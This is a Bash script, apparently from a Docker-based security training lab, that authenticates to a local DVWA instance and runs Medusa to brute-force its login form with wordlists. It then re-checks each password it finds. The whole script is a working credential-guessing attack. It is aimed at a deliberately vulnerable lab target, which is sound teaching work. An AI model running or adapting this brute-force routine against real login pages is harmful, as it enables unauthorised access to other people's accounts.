#!/usr/bin/env bash
set -euo pipefail

SCRIPT_NAME="$(basename "$0" .sh)"
ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
LOG_DIR="$ROOT_DIR/logs"
mkdir -p "$LOG_DIR"
LOG_FILE="$LOG_DIR/${SCRIPT_NAME}-$(date +%Y%m%d-%H%M%S).log"
if [[ -e "$LOG_FILE" ]]; then
  LOG_FILE="${LOG_FILE%.log}-$$.log"
fi

START_TS=$(date +%s)

log() {
  printf '%s\n' "$*" | tee -a "$LOG_FILE"
}

run() {
  "$@" 2>&1 | tee -a "$LOG_FILE"
}

finish() {
  local end_ts elapsed
  end_ts=$(date +%s)
  elapsed=$((end_ts - START_TS))
  log "$(printf 'Tempo total: %02d:%02d:%02d' \
    $((elapsed / 3600)) \
    $(((elapsed % 3600) / 60)) \
    $((elapsed % 60)))"
}
trap finish EXIT

usage() {
  cat >&2 <<'EOF'
Uso: 11-web-attack.sh --users <arquivo> --passwords <arquivo> --credentials <arquivo> [opcoes]

Opcoes:
  --host <ip>        Host web (padrao: 172.28.0.11)
  --threads <N>      Threads do Medusa (padrao: 1)
  --output <path>    Log do Medusa dentro do Kali (padrao: /logs/medusa-web-<timestamp>.log)
EOF
}

USERS=""
PASSWORDS=""
CREDENTIALS=""
HOST="172.28.0.11"
THREADS=1
OUTPUT="/logs/medusa-web-$(date +%Y%m%d-%H%M%S).log"

while [[ $# -gt 0 ]]; do
  case "$1" in
    --users)
      USERS="${2:-}"
      shift 2
      ;;
    --passwords)
      PASSWORDS="${2:-}"
      shift 2
      ;;
    --credentials)
      CREDENTIALS="${2:-}"
      shift 2
      ;;
    --host)
      HOST="${2:-}"
      shift 2
      ;;
    --threads)
      THREADS="${2:-}"
      shift 2
      ;;
    --output)
      OUTPUT="${2:-}"
      shift 2
      ;;
    -h|--help)
      usage
      exit 0
      ;;
    *)
      log "ERRO: opcao desconhecida: $1"
      usage
      exit 1
      ;;
  esac
done

if [[ -z "$USERS" || -z "$PASSWORDS" || -z "$CREDENTIALS" ]]; then
  log "ERRO: --users, --passwords e --credentials sao obrigatorios"
  usage
  exit 1
fi

for f in "$USERS" "$PASSWORDS" "$CREDENTIALS"; do
  if [[ ! -f "$f" ]]; then
    log "ERRO: arquivo nao encontrado: $f"
    exit 1
  fi
done

if [[ "$(docker inspect -f '{{.State.Running}}' lab-kali 2>/dev/null || true)" != "true" ]]; then
  log "ERRO: lab-kali nao esta em execucao; rode 09-kali-setup.sh primeiro"
  exit 1
fi

to_container_path() {
  local p=$1
  if [[ "$p" == "$ROOT_DIR/wordlists/"* ]]; then
    printf '/wordlists/%s' "${p#"$ROOT_DIR/wordlists/"}"
  elif [[ "$p" == wordlists/* ]]; then
    printf '/wordlists/%s' "${p#wordlists/}"
  elif [[ "$p" == /wordlists/* ]]; then
    printf '%s' "$p"
  else
    log "ERRO: o arquivo deve estar em wordlists/: $p"
    exit 1
  fi
}

USERS_C="$(to_container_path "$USERS")"
PASSWORDS_C="$(to_container_path "$PASSWORDS")"

ADMIN_PASS="$(awk -F: '$1 == "admin" {print $2; exit}' "$CREDENTIALS")"
if [[ -z "$ADMIN_PASS" ]]; then
  log "ERRO: usuario 'admin' nao encontrado em $CREDENTIALS"
  exit 1
fi

log "== Ataque Web/DVWA com Medusa =="
log "Host: $HOST"
log "Usuarios: $USERS_C ($(wc -l < "$USERS") linhas)"
log "Senhas: $PASSWORDS_C ($(wc -l < "$PASSWORDS") linhas)"
log "Threads: $THREADS"
log "Log do Medusa: $OUTPUT"

log "Obtendo sessao autenticada no DVWA..."
docker exec -i \
  -e ADMIN_PASS="$ADMIN_PASS" \
  -e HOST="$HOST" \
  lab-kali bash -s 2>&1 <<'INNER' | tee -a "$LOG_FILE"
set -e
COOKIE=/tmp/dvwa.cookie
rm -f "$COOKIE"
TOKEN=$(curl -s -c "$COOKIE" "http://$HOST/DVWA/login.php" | awk -F"value='" '/user_token/ {print $2}' | cut -d"'" -f1)
if [ -z "$TOKEN" ]; then
  echo "ERRO: token CSRF nao encontrado no login"
  exit 1
fi
curl -s -L -b "$COOKIE" -c "$COOKIE" \
  -d "username=admin&password=$ADMIN_PASS&user_token=$TOKEN&Login=Login" \
  "http://$HOST/DVWA/login.php" >/dev/null
SESSION=$(awk '$6 == "PHPSESSID" {print $7}' "$COOKIE")
if [ -z "$SESSION" ]; then
  echo "ERRO: PHPSESSID nao encontrado"
  exit 1
fi
BODY=$(curl -s -b "security=low; PHPSESSID=$SESSION" "http://$HOST/DVWA/vulnerabilities/brute/")
if printf '%s' "$BODY" | grep -q "Vulnerability: Brute Force"; then
  echo "OK: sessao autenticada"
else
  echo "ERRO: sessao nao autenticada"
  exit 1
fi
INNER

SESSION="$(docker exec lab-kali awk '$6 == "PHPSESSID" {print $7}' /tmp/dvwa.cookie)"
if [[ -z "$SESSION" ]]; then
  log "ERRO: nao foi possivel obter o PHPSESSID"
  exit 1
fi

MEDUSA_ARGS=(
  medusa
  -h "$HOST"
  -U "$USERS_C"
  -P "$PASSWORDS_C"
  -M web-form
  -m "FORM:/DVWA/vulnerabilities/brute/"
  -m "DENY-SIGNAL:Username and/or password incorrect"
  -m "FORM-DATA:get?username=&password=&Login=Login"
  -m "CUSTOM-HEADER:Cookie: security=low; PHPSESSID=$SESSION"
  -t "$THREADS"
  -v 4
  -O "$OUTPUT"
)

if (( $(wc -l < "$USERS") == 1 )); then
  MEDUSA_ARGS+=(-f)
  log "Um unico usuario: usando -f para parar no primeiro sucesso"
fi

if ! run docker exec lab-kali "${MEDUSA_ARGS[@]}"; then
  log "AVISO: Medusa retornou codigo nao zero"
fi

HOST_OUTPUT="$ROOT_DIR/logs/$(basename "$OUTPUT")"
if [[ ! -f "$HOST_OUTPUT" ]]; then
  log "ERRO: log do Medusa nao encontrado em $HOST_OUTPUT"
  exit 1
fi

FOUND="$(grep -E 'ACCOUNT FOUND' "$HOST_OUTPUT" || true)"
if [[ -z "$FOUND" ]]; then
  log "ERRO: nenhuma credencial encontrada"
  exit 1
fi

log "Credenciais encontradas:"
printf '%s\n' "$FOUND" | tee -a "$LOG_FILE"

validate_web() {
  local user=$1
  local pass=$2
  docker exec -i \
    -e V_USER="$user" \
    -e V_PASS="$pass" \
    -e V_HOST="$HOST" \
    lab-kali bash -s 2>&1 <<'INNER' | tee -a "$LOG_FILE"
set -e
COOKIE=$(mktemp)
TOKEN=$(curl -s -c "$COOKIE" "http://$V_HOST/DVWA/login.php" | awk -F"value='" '/user_token/ {print $2}' | cut -d"'" -f1)
curl -s -L -b "$COOKIE" -c "$COOKIE" \
  -d "username=$V_USER&password=$V_PASS&user_token=$TOKEN&Login=Login" \
  "http://$V_HOST/DVWA/login.php" >/dev/null
SESSION=$(awk '$6 == "PHPSESSID" {print $7}' "$COOKIE")
BODY=$(curl -s -b "security=low; PHPSESSID=$SESSION" "http://$V_HOST/DVWA/vulnerabilities/brute/")
rm -f "$COOKIE"
if printf '%s' "$BODY" | grep -q "Vulnerability: Brute Force"; then
  echo "OK: validado $V_USER"
else
  echo "ERRO: falha ao validar $V_USER"
  exit 1
fi
INNER
}

log "Validando credenciais..."
while IFS= read -r line; do
  user="$(printf '%s\n' "$line" | sed -n 's/.*User: \([^ ]*\).*/\1/p')"
  pass="$(printf '%s\n' "$line" | sed -n 's/.*Password: \([^ ]*\).*/\1/p')"
  [[ -z "$user" || -z "$pass" ]] && continue
  validate_web "$user" "$pass"
done <<< "$FOUND"

log "== Ataque Web/DVWA concluido =="
